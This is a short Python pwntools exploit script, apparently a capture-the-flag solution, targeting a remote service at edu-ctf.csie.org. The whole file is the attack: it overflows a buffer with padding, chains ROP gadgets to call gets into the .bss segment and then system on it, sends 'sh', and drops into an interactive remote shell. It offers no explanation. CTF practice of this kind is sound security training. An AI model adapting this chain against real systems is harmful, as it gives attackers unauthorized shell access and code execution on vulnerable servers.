from pwn import *

context.arch = 'amd64'

r = remote('edu-ctf.csie.org', 10174)

pop_rdi = 0x400733

gets_plt = 0x400530
system_plt = 0x400520

bss = 0x601070

p = flat(
        'a' * 0x38,
        pop_rdi, # ret
        bss, # allocate writable location
        gets_plt, # write gets to bss
        pop_rdi, # ret
        bss, # allocate writable location
        system_plt # invoke system
        )

r.sendlineafter(':D', p)
r.sendline('sh')
r.interactive()
